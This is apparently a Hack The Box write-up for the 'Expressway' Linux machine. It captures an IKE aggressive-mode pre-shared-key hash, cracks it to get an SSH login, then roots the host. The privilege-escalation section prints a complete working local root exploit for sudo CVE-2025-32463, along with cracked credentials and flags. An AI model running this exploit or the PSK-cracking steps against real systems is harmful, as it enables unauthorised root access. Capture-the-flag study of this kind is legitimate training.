---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Sudo-Chroot
  - ISAKMP
---
# Overview

| Name        | Expressway |
| ----------- | ---------- |
| OS          | Linux      |
| Base Points | Easy [20]  |
| Status      | Done       |
# Recon
## Nmap

```bash
❯ sudo nmap -sC -sV -O 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 00:59 +0545
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 98.08% done; ETC: 01:00 (0:00:01 remaining)
Nmap scan report for 10.10.11.87
Host is up (0.36s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
❯ nmap -p- --min-rate 1000 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 01:07 +0545
Stats: 0:00:39 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 51.91% done; ETC: 01:08 (0:00:32 remaining)
Nmap scan report for 10.10.11.87
Host is up (0.37s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 74.40 seconds
```
## UDP

```bash
❯ nmap -sU --top-ports 100 10.10.11.87
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-21 01:10 +0545
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 99.99% done; ETC: 01:12 (0:00:00 remaining)
Nmap scan report for 10.10.11.87
Host is up (0.36s latency).
Not shown: 96 closed udp ports (port-unreach)
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike

Nmap done: 1 IP address (1 host up) scanned in 122.97 seconds
```
# Initial Foothold
## ISAKMP 

**Port 500/udp (ISAKMP/IKE)** is very interesting! This is often used for VPN connections and can be vulnerable.

```bash
# Check for aggressive mode (common vulnerability)
❯ ike-scan -M -A 10.10.11.87
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=4bb4a7f9c1bdc10e)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.383 seconds (2.61 hosts/sec).  1 returned handshake; 0 returned notify
```
## Getting Hash

```bash
❯ echo "10.10.11.87 expressway.htb" | sudo tee -a /etc/hosts
[sudo] password for at0m:
10.10.11.87 expressway.htb

❯ ike-scan -M -A --id=ike@expressway.htb 10.10.11.87 -P ike_hash.txt
WARNING: gethostbyname failed for "ike_hash.txt" - target ignored: Resource temporarily unavailable
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=086ef735d6a45cff)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
a281b0494450350188ab09512b894ada85d24b473635c1667e110f9b8fe5531958243abfaa967803a583eaaa41c0b87539b3ac08e70c0eeb1121cabfe125677ddb825c5131a10c3590d7875862cf4759013a1a09e27f2aad0c871bd466406ae30479580cff2bc154c355cda97f8e2b4182e4541e52c6854b3c4fcc103b404789:434c1bd0d4623947bb3a21a412bac54944e669b2a815ba077dc6eae06c5e7b87ef520cbd77ee81a93606ab2f0657d37787a2f80dc577a8b49e9d5edfc995e6bba202356d747952c09d2727d2fbb9415be3d7ecf64472f1b074b57d8d231e87f9347f14d3349f86dd5a44944fec56c9fa9b15734f4b89f656dfcad49b712feafa:086ef735d6a45cff:aa5e0f5716a083f3:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:247f76ec2aa96bfe39656c49bd1b52021bad961f:e33a20dee78c3f86eb4ffd0dbfe5c310d269f39706b857fbead64664b48f9ba6:ffaa154b945a73fd06ba7562a1e4dc9da1b3d147
Ending ike-scan 1.9.6: 1 hosts scanned in 10.394 seconds (0.10 hosts/sec).  1 returned handshake; 0 returned notify
```

```bash
❯ cat ike_hash.txt
a281b0494450350188ab09512b894ada85d24b473635c1667e110f9b8fe5531958243abfaa967803a583eaaa41c0b87539b3ac08e70c0eeb1121cabfe125677ddb825c5131a10c3590d7875862cf4759013a1a09e27f2aad0c871bd466406ae30479580cff2bc154c355cda97f8e2b4182e4541e52c6854b3c4fcc103b404789:434c1bd0d4623947bb3a21a412bac54944e669b2a815ba077dc6eae06c5e7b87ef520cbd77ee81a93606ab2f0657d37787a2f80dc577a8b49e9d5edfc995e6bba202356d747952c09d2727d2fbb9415be3d7ecf64472f1b074b57d8d231e87f9347f14d3349f86dd5a44944fec56c9fa9b15734f4b89f656dfcad49b712feafa:086ef735d6a45cff:aa5e0f5716a083f3:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:247f76ec2aa96bfe39656c49bd1b52021bad961f:e33a20dee78c3f86eb4ffd0dbfe5c310d269f39706b857fbead64664b48f9ba6:ffaa154b945a73fd06ba7562a1e4dc9da1b3d147
```
## Cracking the Hash

```bash
❯ psk-crack -d /usr/share/wordlists/rockyou.txt ike_hash.txt
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash ffaa154b945a73fd06ba7562a1e4dc9da1b3d147
Ending psk-crack: 8045040 iterations in 30.614 seconds (262792.85 iterations/sec)
```

We got `freakingrockstarontheroad`

We exploited a misconfigured IPSec VPN server using IKE (Internet Key Exchange) with Aggressive Mode enabled, which allowed us to capture a cryptographic hash containing the Pre-Shared Key (PSK). By cracking this hash with a password list, we obtained the VPN password ("freakingrockstarontheroad").
## SSH

```bash
❯ ssh ike@10.10.11.87
ike@10.10.11.87's password: freakingrockstarontheroad
Last login: Sat Sep 20 20:38:39 BST 2025 from 10.10.14.165 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep 20 20:39:02 2025 from 10.10.14.167
ike@expressway:~$ ls
chroot  libnss_  payload  sudo_chroot_exploit  user.txt
ike@expressway:~$ cat user.txt
218991079601abe44da2d7b88b289c84
ike@expressway:~$
```
# Privilege Escalation

```bash
ike@expressway:/tmp$ sudo --version
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```
## [CVE-2025-32463](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot)
## Quick vulnerability check

```bash
# Vulnerable sudo
pwn ~ $ sudo -R woot woot
sudo: woot: No such file or directory

# Patched sudo
pwn ~ $ sudo -R woot woot
[sudo] password for pwn:
sudo: you are not permitted to use the -R option with woot
```

```bash
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
```

```bash
ike@expressway:/tmp$ # Or run the exploit commands directly
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/sh", "sh", "-c", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
woot!
root@expressway:/# whoami
root
root@expressway:/# cat /root/root.txt
e4cba138dc8088f9d58e00805cc84052
```

---
